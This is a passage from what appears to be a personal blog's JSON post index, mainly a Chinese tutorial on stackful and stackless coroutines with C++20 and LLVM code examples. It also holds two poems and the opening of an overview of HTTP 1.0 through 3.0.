&#123;&#125; close(listenfd); return 0;&#125; Case 1: 不开启 REUSEADDR 和 REUSEPORT，使用相同 IP 和 PORT Case 2: 开启 REUSEADDR ，但是不调用 listen，使用相同 IP 和 PORT Case 3: 开启 REUSEADDR ，调用 listen，使用相同 IP 和 PORT Case 4: 开启 REUSEPORT ，调用 listen，使用相同 IP 和 PORT","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Computer Network","slug":"Notes/Computer-Network","permalink":"https://racleray.github.io/categories/Notes/Computer-Network/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Network","slug":"Network","permalink":"https://racleray.github.io/tags/Network/"},{"name":"Socket","slug":"Socket","permalink":"https://racleray.github.io/tags/Socket/"}],"author":"HeRui"},{"title":"Dangle","slug":"Dangle","date":"2024-02-12T14:45:50.000Z","updated":"2024-02-12T15:00:59.813Z","comments":true,"path":"posts/e3a85bcd.html","link":"","permalink":"https://racleray.github.io/posts/e3a85bcd.html","excerpt":"凡人","text":"Incomprehension A Journey to the West 一望无际的梦里，用碗里的米垒墙 乌云写满咒语，遮住众生疲惫的骨头 狐狸在山坡念念有词 灶台上的年兽反复冬眠 晨昏线割开大地的指纹 水草缠住风，冻结梦境的递归 胸口的鸟群，绕过十万个太阳 带走被浇灭的闪电 带走云层潮汐 带走神明的悄悄话 带走落地生根的猫 带走氧化的情歌 带走山野恩仇 带走金银财宝 带走痴心妄想 带走梦游的脚印 带走飞蛾扑不灭的火 带走所有人的名字 带走彩虹的化石","categories":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/categories/Poetry/"},{"name":"Meditation","slug":"Poetry/Meditation","permalink":"https://racleray.github.io/categories/Poetry/Meditation/"}],"tags":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/tags/Poetry/"}],"author":"HeRui"},{"title":"Poetry","slug":"Poetry","date":"2024-01-24T04:20:56.000Z","updated":"2024-02-06T13:33:01.096Z","comments":true,"path":"posts/cdfe5c99.html","link":"","permalink":"https://racleray.github.io/posts/cdfe5c99.html","excerpt":"Seven Times Have I Despised My Soul","text":"Seven Times Have I Despised My Soul Khalil Gibran ​ Seven times have I despired my soul. ​ ​ The first time when I saw her being meek that she might attain height. ​ The second time when I saw her limping before the crippled. ​ The third time when she was given to choose between the hard and the easy, ​ and she chose the easy. ​ The fourth time when she committed a wrong, and comforted herself that others also commit wrong. ​ The fifth time when she forbore for weakness, and attributed her patience to strength. ​ The sixth time when she despired the ugliness of a face, and knew not that it was one of her own masks. ​ And the seventh time when she sang a song of praise, and deemed it a virtue.","categories":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/categories/Poetry/"},{"name":"1","slug":"Poetry/1","permalink":"https://racleray.github.io/categories/Poetry/1/"}],"tags":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/tags/Poetry/"}],"author":"HeRui"},{"title":"协程浅析","slug":"协程浅析","date":"2023-12-02T13:48:25.000Z","updated":"2024-01-09T10:20:42.807Z","comments":true,"path":"posts/dd6997a0.html","link":"","permalink":"https://racleray.github.io/posts/dd6997a0.html","excerpt":"为什么C++协程标准库来得这么晚捏？","text":"协程是可以暂停执行，之后恢复的函数。 有栈协程 vs 无栈协程 有栈协程通过固定大小的栈空间作为协程运行时空间，切换协程就是这些固定大小空间直接的切换，协程内的程序逻辑全部运行在这段空间内。而无栈协程将 frame 保存在堆空间（C++20 是这样做的），依据协程的状态进行统一的调度执行。 有栈协程，每个协程会有固定大小的空间作为栈内存使用。 无栈协程，每个协程会有一个协程帧作为状态和变量的管理对象，然后进行类似状态机的函数调用过程。 无栈协程内存紧凑，但是不适合递归。有栈协程虽然适合递归，但是分配的固定空间，可能会浪费，也可能会不足，这是有栈协程的问题。 总的来说： 无栈的切换速度要远高于有栈。 无栈协程更加适合IO场景。 无栈协程相比普通函数会有额外开销。 更详细的对比，可以参考这篇优质的量化文档：基于async_simple的协程性能定量分析 有栈协程 有栈协程不关心协程函数体是什么，直接开辟一边内存（goroutine 中是 2000 Bytes），将这片空间和整个函数体，告知调度器去调度。而协程内部，会实现某个函数或者调度点，运行到此处时，会识别到当前处于协程空间中，会转移执行权（比如，等待 IO 时）。协程并没有显式的 await 暂停点出现，而是在协程内部实现。 协程栈也可以有其他不同的实现方式： 分段栈(Segmented Stack)：编译时，为协程栈增加栈内存检测标记，检测是否够用，是否需要申请更多内存。 拷贝栈(Copy Stack)：采用和 std::vector 相同的方式，动态扩展并拷贝栈。 共享栈(Shared Stack)：首先申请一块较大内存的共享栈，然后每次运行新协程前，将协程栈内存 copy 共享栈中，随着协程的运行计算真正用到的内存，将其 copy 到一段合适的内存中。libco 采用的就是这种方式。 虚拟内存栈(Virtual Memory Stack)：为每个协程申请虚拟内存，不读写就不会占物理内存，按照实际使用的内存量申请物理内存页面。 协程调度方式： 栈式调度，按照调用栈关系，每次执行调用栈栈顶的协程 星型调度，每次执行完一个协程，必须切换回调度线程，然后再进入下一个协程 环形调度，协程之间有调用链，但是执行完最后一个协程后，直接返回调度线程 协程调度的优化方法有： 结合多线程，充分利用多核能力。 每个线程设计协程队列，同时可以划分不同的队列类型，区分能够在多线程间进行转移的协程，和不能转移的协程。 采用负载均衡策略，调度协程，比如，空闲线程（可以定义为超过某个\"水位\"）可以窃取忙碌线程协程队列中的任务。 队列设计优化，比如对于短时快速任务，可以使用 spinlock；对于线程内的就绪队列，可以视情况，设计为多写一读的结构，仅在写端加锁。 保存上下文，则是将寄存器的值保存下来。goroutine 也是采用有栈协程的方式实现的。 boost.context, boost.coroutine, ucontext(unix), fiber(windows) 这些库提供底层 API，没有实现协程调度模块，不适合直接做应用项目。另外 ucontext 被 fiber 库性能相对会较差一点。boost.context 的性能会更好。 腾讯的 libco 虽然做了协程调度，也兼容很多第三方库的调用接口，但是也需要对底层机制较为清楚，才能写出更稳定的代码。比如，不同的系统、不同版本的Linux都需要不同的汇编代码。 一个简单的汇编程序示例： 12345678910111213141516171819&#x2F;&#x2F; 保存8个32位元素的数组，数组首地址保存在 eax 寄存器movl %esp, 28(%eax) movl %ebp, 24(%eax)movl %esi, 20(%eax)movl %edi, 16(%eax)movl %edx, 12(%eax)movl %ecx, 8(%eax)movl %ebx, 4(%eax)&#x2F;&#x2F; eax 是第一个元素&#x2F;&#x2F; 假设新上下文中从 esp + 8 的位置开始恢复数组元素到寄存器movl 8(%esp), %eax movl 4(%eax), %ebxmovl 8(%eax), %ecxmovl 12(%eax), %edx movl 16(%eax), %edimovl 20(%eax), %esimovl 24(%eax), %ebpmovl 28(%eax), %esp 假设这是一个函数内的一段代码，其中 eax 为传入数组首地址作为第一个参数，esp + 8 为另一个数组首地址作为第二个参数。以上代码，就将是将当前上下文寄存器保存到第一个参数的数组中，然后从第二个数组中加载新的上下文的寄存器的值。 这种嵌套切换上下文的方式，保证当前调用栈栈顶的协程先执行结束，然后执行前一个协程。这种有明显层级切换结构的协程，也称为 非对称协程。 ucontext_t 12345678910111213141516171819202122232425262728293031// 上下文结构体typedef struct ucontext_t &#123; // 当前上下文结束后，下一个激活的上下文对象的指针，只在当前上下文是由makecontext创建时有效 struct ucontext_t *uc_link; // 当前上下文的信号屏蔽掩码 sigset_t uc_sigmask; // 当前上下文使用的栈内存空间，只在当前上下文是由makecontext创建时有效 stack_t uc_stack; // 平台相关的上下文具体内容，包含寄存器的值 mcontext_t uc_mcontext; ...&#125; ucontext_t;// 获取当前的上下文int getcontext(ucontext_t *ucp);// 将 getcontext 获取到的上下文指针ucp，与一个函数 func 进行绑定，支持指定func运行时的参数，// 在调用 makecontext 之前，必须手动给 ucp 分配一段内存空间，存储在 ucp-&gt;uc_stack 中，作为 func 函数运行时的栈空间，// 可以指定 ucp-&gt;uc_link，func 运行结束后恢复 uc_link 指向的上下文// makecontext 执行完后，ucp就与函数func绑定了，调用 setcontext 或 swapcontext 激活 ucp 时，func 就会被运行// 如果不指定 uc_link，那 func函数结束时必须显式调用 setcontext 或 swapcontext 以重新指定一个有效的上下文，否则程序就跑飞了void makecontext(ucontext_t *ucp, void (*func)(), int argc, ...);// 恢复 ucp 指向的上下文，这个函数会跳转到 ucp上下文 对应的函数中执行，相当于变相调用了函数，但是不会返回。int setcontext(const ucontext_t *ucp);// 恢复 ucp 指向的上下文，同时将当前的上下文存储到 oucp 中// 和 setcontext 一样，swapcontext 会跳转到 ucp上下文 对应的函数中执行，但是不会返回int swapcontext(ucontext_t *oucp, const ucontext_t *ucp); 无栈协程 无栈协程的典型实现是 async / await 模型。async 标志会使得编译器，创建一个协程帧，保存函数参数、跨越协程暂停点的局部变量。await 表示程序在这里转移执行权，等待 await 后面的程序执行完成，编译器应该在这之后去生成转移执行权的代码。 无栈协程本质上是一个状态机（state machine），利用系统栈进行协程切换。恢复执行所需的数据，和程序运行时的栈是分离存储的。比如把协程的 frame 数据放在堆中，而不是栈中，也就不会在函数返回时被回收。从而可以实现异步执行的顺序代码，不用显式的回调来处理非阻塞的输入和输出。 12345678910111213141516171819202122232425262728293031// 无栈协程抽象出的一个类struct abstract_coroutine &#123; int val; int state = 0; // interface void run() &#123; switch (state) &#123; case 0: return sub_proc_1(); case 1: return sub_proc_2(); case 2: return sub_proc_3(); &#125; &#125; void sub_proc_1() &#123; val = 0; state = 1; &#125; void sub_proc_2() &#123; val = 1; state = 2; &#125; void sub_proc_3() &#123; val--; &#125;&#125;; 每个部分执行完成后，状态转移。下一次调用 run 时，执行下一个函数调用。这种方式，没有有栈协程的显式上下文切换。这种方式和函数执行和返回几乎没有区别。难点在于如何实现高效地协程调度机制。 对称协程 vs 非对称协程 非对称协程，协程之间有严格的父子关系，由调度器负责所有调度。 对称式协程，协程之间地位平等。 Coroutines in C LLVM Coroutines 实现的无栈协程伪代码： 123456789101112131415161718void *f(int n) &#123; void *hdl = CORO_BEGIN(malloc); for (int i = n;; ++i) &#123; CORO_SUSPEND(hdl); print(i); CORO_SUSPEND(hdl); print(-i); &#125; CORO_END(hdl, free);&#125;int main() &#123; void *coro = f(1); for (int i = 0; i &lt; 4; ++i) &#123; CORO_RESUME(coro); &#125; CORO_DESTROY(coro);&#125; 以上程序的协程帧数据可以定义如下： 1234struct f.frame &#123; // 只有 i 跨越了协程的调用，而 n 在协程 SUSPEND 处理之前已经没用了 int i;&#125;; 而编译器会继续优化，比如： 123456789101112131415161718192021void *f(int n) &#123; void *hdl = CORO_BEGIN(malloc); f.frame *frame = (f.frame *)hdl; for (frame-&gt;i = n;; ++frame-&gt;i) &#123; frame-&gt;suspend_index = 0; r0: CORO_SUSPEND(hdl); print(frame-&gt;i); frame-&gt;suspend_index = 1; r1: CORO_SUSPEND(hdl); print(-frame-&gt;i); &#125; CORO_END(hdl, free);&#125;// 此时协程帧数据struct f.frame &#123; int suspend_index; int i;&#125;; 编译器同时，会生成三个函数调用： 123456789101112131415161718192021222324252627282930313233343536373839// coroutine start functionvoid* f(int *n) &#123; void* hdl = CORO_BEGIN(malloc); f.frame* frame = (f.frame*)hdl; frame-&gt;ResumeFn = &amp;f.resume; frame-&gt;DestroyFn = &amp;f.destroy; frame-&gt;i = n; frame-&gt;suspend_index = 0; return coro_hdl;&#125;// coroutine resume functionvoid f.resume(f.frame *frame) &#123; switch (frame-&gt;suspend_index) &#123; case 0: goto r0; default: goto r1; &#125; for (frame-&gt;i = n;; ++frame-&gt;i) &#123; frame-&gt;suspend_index = 0; r0: CORO_SUSPEND(hdl); print(frame-&gt;i); frame-&gt;suspend_index = 1; r1: CORO_SUSPEND(hdl); print(-frame-&gt;i); &#125; CORO_END(hdl, free);&#125;// coroutine destroy functionvoid f.destroy(f.frame *frame) &#123; switch (frame-&gt;suspend_index) &#123; … &#125; free(frame);&#125; 此时的协程帧中数据为： 123456struct f.frame &#123; FnPtr ResumeFn; FnPtr DestroyFn; int suspend_index; int i;&#125;; LLVM Coroutines 中定义了以下宏，用于处理协程的不同状态： 12345678910111213141516171819#define CORO_SUSPEND() \\ switch (__builtin_coro_suspend()) &#123; \\ case -1: \\ goto coro_Suspend; \\ case 1: \\ goto coro_Cleanup; \\ default: \\ break; \\ &#125;#define CORO_END(hdl, FreeFunc) \\ coro_Cleanup : &#123; \\ void *coro_mem = __builtin_coro_free(hdl); \\ if (coro_mem) \\ FreeFunc(coro_mem); \\ &#125; \\ coro_Suspend: \\ __builtin_coro_end(); \\ return coro_hdl; C++20 协程 C++20 协程是无栈协程。定义中包含了以下3种表达式之一的函数，就是一个协程。 co_await 表达式——用于暂停执行，直到恢复： 123456789task&lt;&gt; tcp_echo_server()&#123; char data[1024]; while (true) &#123; std::size_t n = co_await socket.async_read_some(buffer(data)); co_await async_write(socket, buffer(data, n)); &#125;&#125; co_yield 表达式——用于暂停执行并返回一个值： 12345generator&lt;int&gt; iota(int n = 0)&#123; while (true) co_yield n++;&#125; co_return 语句——用于完成执行并返回一个值： 1234lazy&lt;int&gt; f()&#123; co_return 7;&#125; 每个协程都与下列对象关联： 承诺（promise）对象，在协程内部操纵。协程通过此对象提交其结果或异常。 协程句柄 (coroutine handle)，在协程外部操纵。这是用于恢复协程执行或销毁协程帧的不带所有权句柄。 协程状态 (coroutine state)，它是一个动态存储分配（除非自定义分配方式）的内部对象，其包含： promise 对象 各个形参（全部按值复制） 当前暂停点的一些表示，使得程序在恢复时知晓要从何处继续，销毁时知晓有哪些局部变量在作用域内 生存期超过当前暂停点的局部变量和临时量 当协程开始执行时，它进行下列操作： 用 operator new 分配协程状态对象 将所有函数形参复制到协程状态中：按值传递的形参被移动或复制，按引用传递的参数保持为引用（因此，如果在被指代对象的生存期结束后恢复协程，它可能变成悬垂引用） 调用承诺对象的构造函数。如果承诺类型拥有接收所有协程形参的构造函数，那么以复制后的协程实参调用该构造函数。否则调用其默认构造函数。 调用 promise.get_return_object() 并将结果保存在局部变量中。该调用的结果将在协程首次暂停时返回给调用方。至此并包含这个步骤为止，任何抛出的异常均传播回调用方，而非置于 promise 中。 调用 promise.initial_suspend() 并 co_await 它的结果。典型的承诺类型 Promise 要么（对于惰性启动的协程）返回std::suspend_always，要么（对于急切启动的协程）返回std::suspend_never。 当 co_await promise.initial_suspend() 恢复时，开始协程体的执行。 一个跨线程调度协程示例 程序实现了 producer 协程运行在线程2中， 500ms 后生成一个 val ；consumer 协程运行在线程 1 中，并会被调度到线程2 中执行，最后读取出 val。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include &lt;coroutine&gt;#include &lt;chrono&gt;#include &lt;future&gt;#include &lt;iostream&gt;#include &lt;thread&gt;using namespace std;struct Task &#123; struct promise_type; using handle_type = std::coroutine_handle&lt;promise_type&gt;; handle_type h; // 协程的 handle std::future&lt;void&gt; fut; //================================================================================= // promise struct promise_type &#123; int result; coroutine_handle&lt;&gt; h_next = nullptr; // 调度的下一个协程 Task get_return_object() &#123; return Task&#123; handle_type::from_promise(*this) &#125;; &#125; suspend_always initial_suspend() &#123; return &#123;&#125;;&#125;; auto final_suspend() noexcept &#123; // 被 await 后，如果 h_next 不为空，则返回 h_next(调度到指定协程)，否则返回 std::noop_coroutine() (调度到协程的调用者) struct next_awaiter &#123; // as a promise promise_type* self; bool await_ready() noexcept &#123; return false; &#125; // will suspend void await_resume() noexcept &#123;&#125;; coroutine_handle&lt;&gt; await_suspend(coroutine_handle&lt;promise_type&gt; hdl) noexcept &#123; if (hdl.promise().h_next) &#123; return hdl.promise().h_next; // 返回 h_next ，即调度的到下一个协程 &#125; else &#123; return std::noop_coroutine(); &#125; &#125; &#125;; return next_awaiter&#123; this &#125;; &#125; // called at co_return void return_value(int i) &#123; result = i; &#125; void unhandled_exception() &#123;&#125; &#125;; //================================================================================= // awaiter definition bool await_ready() &#123; return false; &#125; // go to await_suspend // co_await will call await_suspend void await_suspend(handle_type hdl) &#123; h.promise().h_next = hdl; // 设置下一个协程(consume) // 另开线程执行 producer 协程 resume() , 此时异步地开始执行 produce() 函数 fut = std::async([this]() &#123; h.resume(); &#125;); &#125; int await_resume() &#123; return h.promise().result; &#125;&#125;;// 协程 producerTask produce() &#123; // producer 协程 resume() ，从这里开始执行 int val = 1111; std::this_thread::sleep_for(std::chrono::milliseconds(500)); cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" produce: \" &lt;&lt; val &lt;&lt; endl; co_return val; // promise::return_value(int) // final_suspend 返回 consumer 的 coroutine_handle，即调度到 consumer 协程 // 注意，此时 producer 协程还存在，同时，当前运行在 async 线程中&#125;// 协程 consumerTask consume(Task&amp; fut) &#123; cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" consume: waiting \" &lt;&lt; endl; // 这里的 co_await 的是 producer (fut) ，传入 producer::await_suspend 的是 consumer 的 coroutine_handle // 从 producer::await_suspend 开始执行 int val = co_await fut; // 从 producer::final_suspend 执行结束后，调度到 consumer 协程，从此处开始执行 // 在此之前，由 producer::await_resume 返回的结果，保存到 val // ！！！注意，此时 consumer 协程运行在 async 线程中 cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" consume: \" &lt;&lt; val &lt;&lt; endl; co_return 0; // promise::return_value(int) // 协程结束执行，即 async 线程结束&#125;int main() &#123; // 初始化协程 auto prod = produce(); auto cons = consume(prod); // consumer 协程 ，从 co_await 开始执行 cons.h.resume(); // 等待协程 consumer 协程执行完毕，但是当前程序不会阻塞，而是忙等待 while (!cons.h.done()) &#123; cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" main: waiting \" &lt;&lt; endl; std::this_thread::sleep_for(std::chrono::milliseconds(100)); &#125; cout &lt;&lt; std::this_thread::get_id() &lt;&lt; \" main: done\" &lt;&lt; endl; return 0; // 主线程结束，协程析构&#125; co_await 作为一个一元操作符，暂停协程并将控制权返回给调用方。 将操作对象转化为可等待体 awaitable 对象 调用 awaiter.await_ready() 返回 false 暂停协程，此时协程已经完全暂停，可以在不同线程间转移协程句柄，而且不需要额外同步处理。 调用 awaiter.await_suspend(handle) ，其中 handle 表示当前协程的协程句柄： await_suspend 返回 void ，那么将控制权返回给协程的调用方，而暂停当前协程。 await_suspend 返回 true，也将控制权返回给调用方；返回 false ，则继续执行当前协程。 await_suspend 返回 其他协程的句柄，那么 handle.resume() 恢复执行其他协程，最终会返回到当前协程。 await_suspend 抛出异常，那么会向上一层调用者抛出异常。 返回 true 不会暂停协程 调用 awaiter.await_resume() ，它的返回结果就是 co_await expr 的返回结果。 由于如果执行到 awaiter.await_suspend，那么协程已经完全暂停，可以在不同线程间转移协程句柄，而且不需要额外同步处理。比如，将协程句柄写入回调函数，在某个异步 IO 操作完成时运行该协程。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;coroutine&gt;#include &lt;iostream&gt;#include &lt;stdexcept&gt;#include &lt;thread&gt;auto switch_to_new_thread(std::jthread&amp; out) &#123; struct awaitable &#123; std::jthread* p_out; bool await_ready() &#123; return false; &#125; void await_suspend(std::coroutine_handle&lt;&gt; h) &#123; std::jthread&amp; out = *p_out; if (out.joinable()) &#123; throw std::runtime_error(\"thread already started, needed to be null, then generated by internal suspend\"); &#125; out = std::jthread([h] &#123;h.resume();&#125;); std::cout &lt;&lt; \"New thread \" &lt;&lt; out.get_id() &lt;&lt; \" started\\n\"; &#125; void await_resume() &#123;&#125; &#125;; return awaitable&#123;&amp;out&#125;;&#125;struct task &#123; struct promise_type &#123; task get_return_object() &#123; return &#123;&#125;; &#125; std::suspend_never initial_suspend() &#123; return &#123;&#125;; &#125; std::suspend_never final_suspend() noexcept &#123; return &#123;&#125;; &#125; void return_void() &#123;&#125; void unhandled_exception() &#123;&#125; &#125;;&#125;;task resuming_on_new_thread(std::jthread&amp; out) &#123; std::cout &lt;&lt; \"coroutine start, current thread \" &lt;&lt; std::this_thread::get_id() &lt;&lt; std::endl; co_await switch_to_new_thread(out); std::cout &lt;&lt; \"coroutine end, current thread \" &lt;&lt; std::this_thread::get_id() &lt;&lt; std::endl;&#125;int main() &#123; std::jthread out; resuming_on_new_thread(out); return 0;&#125; std::suspend_always 及 std::suspend_never 就是标准库提供的两个 awaitable 对象。 co_yield yield 表达式向调用方返回一个值并暂停当前协程，在生成器函数中很常见。 123456co_yield expr// 或者co_yield &#123;initializer list&#125;// 等价于co_await promise.yield_value(expr) yield_value 生成器将实参保存到生成器对象中，并返回 suspend_always ，并将控制权交还给调用方。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;coroutine&gt;#include &lt;exception&gt;#include &lt;iostream&gt;#include &lt;memory&gt;template &lt;typename T&gt;struct Generator &#123; // 定义一个 promise_type 类型，用于生成 handle_type struct promise_type; using handle_type = std::coroutine_handle&lt;promise_type&gt;; struct promise_type &#123; T value; // 在 promise 中暂存了值 std::exception_ptr exception; Generator get_return_object() &#123; return Generator(handle_type::from_promise(*this)); &#125; std::suspend_always initial_suspend() &#123; return &#123;&#125;; &#125; std::suspend_always final_suspend() noexcept &#123; return &#123;&#125;; &#125; void unhandled_exception() &#123; exception = std::current_exception(); &#125; template &lt;std::convertible_to&lt;T&gt; From&gt; std::suspend_always yield_value(From&amp;&amp; from) &#123; value = std::forward&lt;From&gt;(from); return &#123;&#125;; &#125; void return_void() &#123;&#125; &#125;; // 构造函数传入 handle_type，用于生成 Generator 对象 handle_type h; Generator(handle_type hdl) : h(hdl) &#123;&#125; ~Generator() &#123; h.destroy(); &#125; explicit operator bool() &#123; fill(); // 调用 fill() 方法，填充 promise 中的值和异常对象；如果过没有使用 operator()，则不会重复执行协程 return !h.done(); &#125; T operator()() &#123; fill(); m_full = false; return std::move(h.promise().value); // 返回 promise 中暂存的值 &#125;private: bool m_full = false; void fill() &#123; if (!m_full) &#123; h(); // 调用 handle_type::operator()，触发协程执行 // handle 中存储的 promise 对象，暂存了当前的目标变量值拷贝和程序异常对象 if (h.promise().exception) &#123; std::rethrow_exception(h.promise().exception); &#125; m_full = true; &#125; &#125;&#125;;Generator&lt;uint64_t&gt;fibonacci_sequence(unsigned n) &#123; if (n == 0) &#123; co_return ; &#125; if (n &gt; 94) &#123; throw std::runtime_error(\"n too large, number will overflow\"); &#125; co_yield 0; if (n == 1) &#123; co_return; &#125; co_yield 1; if (n == 2) &#123; co_return; &#125; uint64_t a = 0; uint64_t b = 1; for (unsigned i = 2; i &lt; n; ++i) &#123; uint64_t s = a + b; co_yield s; a = b; b = s; &#125;&#125;int main() &#123; try &#123; auto gen = fibonacci_sequence(1); for (int j = 0; gen; ++j) &#123; std::cout &lt;&lt; \"fibonacci[\" &lt;&lt; j &lt;&lt; \"] = \" &lt;&lt; gen() &lt;&lt; '\\n'; &#125; &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; \"exception: \" &lt;&lt; e.what() &lt;&lt; '\\n'; &#125; catch (...) &#123; std::cerr &lt;&lt; \"unknown exception\\n\"; &#125; return 0;&#125; co_return co_return expr; 相当于 p.return_value(expr); goto final_suspend; 。 co_return; 相当于 p.return_void(expr); goto final_suspend;。 coroutine_handle 类模板 coroutine_handle 能用于表示，暂停或执行中的协程。使用时要注意避免 dangling 问题，可能会导致 undefined behavior。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include &lt;coroutine&gt;#include &lt;iostream&gt;#include &lt;optional&gt;template &lt;std::movable T&gt;class Generator &#123;public: //================================================================================= // promise_type struct promise_type &#123; std::optional&lt;T&gt; current_value; Generator&lt;T&gt; get_return_object() &#123; return Generator&#123;Handle::from_promise(*this)&#125;; &#125; static std::suspend_always initial_suspend() noexcept &#123; return &#123;&#125;; &#125; static std::suspend_always final_suspend() noexcept &#123; return &#123;&#125;; &#125; std::suspend_always yield_value(T value) noexcept &#123; current_value = std::move(value); return &#123;&#125;; &#125; void await_transform() = delete; [[noreturn]] void unhandled_exception() &#123; throw; &#125; &#125;; using Handle = std::coroutine_handle&lt;promise_type&gt;; explicit Generator(const Handle coroutine) : m_coroutine(coroutine) &#123;&#125; //================================================================================= // constructor Generator() = default; ~Generator() &#123; if (m_coroutine) &#123; m_coroutine.destroy(); &#125; &#125; Generator(const Generator&amp;) = delete; Generator&amp; operator=(const Generator&amp;) = delete; Generator(Generator&amp;&amp; other) : m_coroutine(other.m_coroutine) &#123; other.m_coroutine = &#123;&#125;; &#125; Generator&amp; operator=(Generator&amp;&amp; other) &#123; if (this != &amp;other) &#123; if (m_coroutine) &#123; m_coroutine.destroy(); &#125; m_coroutine = other.m_coroutine; other.m_coroutine = &#123;&#125;; &#125; return *this; &#125; //================================================================================= // for loop support class Iter &#123; public: void operator++() &#123; m_coroutine.resume(); &#125; const T&amp; operator*() &#123; return *m_coroutine.promise().current_value; &#125; // out of range bool operator==(std::default_sentinel_t) const &#123; return !m_coroutine || m_coroutine.done(); &#125; explicit Iter(const Handle coroutine) : m_coroutine(coroutine) &#123;&#125; private: Handle m_coroutine; &#125;; Iter begin() &#123; if (m_coroutine) &#123; m_coroutine.resume(); &#125; return Iter&#123;m_coroutine&#125;; &#125; std::default_sentinel_t end() &#123; return &#123;&#125;; &#125;private: Handle m_coroutine;&#125;;template &lt;std::integral T&gt;Generator&lt;T&gt; range(T first, T last) &#123; while (first &lt; last) &#123; co_yield first; first++; &#125;&#125;int main() &#123; for (const char i : range(65, 91)) &#123; std::cout &lt;&lt; i &lt;&lt; ' '; &#125; std::cout &lt;&lt; '\\n'; return 0;&#125; 数据成员 ptr : void* ，指向协程状态的指针； 成员函数 构造函数 operator= 拷贝赋值 operator coroutine_handle&lt;&gt; 获得类型擦除的 coroutine_handle ，就是说将不同类型的模版，返回统一的类型 done : 检查协程是否完成 operator bool : 检查当前 handle 是否表示协程 operator() 或者 resume : 恢复协程执行 destroy : 销毁协程 promise : 访问协程的 promise 对象 from_promise : 从一个 promise 对象，创建 coroutine_handle address : 返回支撑协程的底层指针 from_address : 从指针地址导入协程 C++20 还为 coroutine_handle 提供了散列特化支持，std::hash。 应用 在设计网络应用时，可以在需要等待IO输入时，将协程 co_await 交还控制权到协程的调用者或者调度到其他协程。当 epoll 中来数据了，触发了IO事件，再在相应的回调函数中 resume 协程的调用。 IO 多路复用 More to read My tutorial and take on C++20 coroutines (stanford.edu)","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Coroutine","slug":"Notes/Coroutine","permalink":"https://racleray.github.io/categories/Notes/Coroutine/"}],"tags":[{"name":"Multi-threading","slug":"Multi-threading","permalink":"https://racleray.github.io/tags/Multi-threading/"},{"name":"Coroutine","slug":"Coroutine","permalink":"https://racleray.github.io/tags/Coroutine/"}],"author":"HeRui"},{"title":"HTTP1.0到3.0浅析","slug":"HTTP1-0到3-0浅析","date":"2023-11-09T06:43:14.000Z","updated":"2024-01-09T10:21:38.146Z","comments":true,"path":"posts/3465c9da.html","link":"","permalink":"https://racleray.github.io/posts/3465c9da.html","excerpt":"HTTP 技术迭代演进","text":"HTTP 1.0 每个对象连接时间：2 * RTT (Round Trip Time) + L/R，即TCP连接建立时间 + HTTP从请求到响应的前几个字节返回的时间 + 对象或者文件传输的时间。 后续多个对象，通过对象文件的并行连接，实现同时多个对象传输。 HTTP 1.1 TPC 连接持久化，因此，n 个对象总共传输消耗：RTT + n * (RTT + L/R) 时间。优化了非并行传输时，HTTP 1.0 的 n * (2 * RTT + L/R)。 流水线优化后，服务器连续不断地发送 n 个对象文件，而不需要每个对象再次请求连接。即，2 * RTT + L/R + RTT + (n - 1) * L/R = 3 * RTT + n * L/R。 HTTP 1.1 的问题 服务器按序响应这些请求。如果先处理大对象，那么后续对象会收到影响。 流水线中，由于按顺序处理，如果出现问题，那么后续对象文件传输会出现问题。 HTTP 2.0 服务端增加了向客户端发送对象的灵活性（RFC 7540） 所用方法、状态码、大部分头部字段都和 HTTP1.1 无异 被请求对象传输次序，会基于客户端指定的优先级 将对象切割为 frames ，调度这些 frames 的传输次序，来缓解传输的阻塞问题（HOL），在大对象传输帧时，调度小对象帧同时传输 可以先向客户端推送一些可能会需要的对象，即使还未请求 支持二进制编码，效率更高 支持头部压缩，减少传输数据量 HTTP 2.0 的改进目标就是减少请求的延时。 HTTP 2.0 的问题 HOL 阻塞问题仍然存在，仍然在恢复丢失的段数据时，仍然会停止后续对象的传输 可用通过并行连接，增加总体吞吐量，但是增加了服务器负担 没有解决安全问题 结合 TLS，会增加一个 RTT 通信时间，但是 HOL 阻塞仍然存在 HTTP 慢启动问题 基于丢失的拥塞控制吞吐抖动 要实现可靠传输，其恢复时间较长，效率低 IP 地址变化，TCP 连接无法维持，移动性支持不好 TCP 序号二义性，在计算 RTO (Retransmission Timeout) 时，取相同序号包中的哪一个进行计算 问题的根源在于 TCP。一个对策是基于 UDP 实现新的传输协议，比如 QUIC。 HTTP 3.0 将应用层 HTTP 2.0 中一些好的功能转移到一个单独的层 QUIC 上。 多路复用，同时传输多个对象 对象分帧交错传输 使用优先级定义传输次序 二进制传输 头部压缩 将 TCP 的部分功能转移到 QUIC： 流量控制和拥塞控制 基于 UDP 重新高效实现 避免TCP 序号二义性问题，RTO 计算问题 基于 UDP 可以实现连接迁移，因为 UDP 是无连接的。 借助成熟的 TLS 1.3 协议，进行握手认证和交换密钥，使用 QUIC 传输报文。 QUIC 是在应用层中实现，便于部署推广 HTTP3.0 实现。 QUIC 协议之上的 HTTP 2.0。 QUIC 连接: C 到 S 两端节点间的一个会话。每个端点自己选择 connection id，用对方的 connection id 标识一个对端连接。 流（stream）: 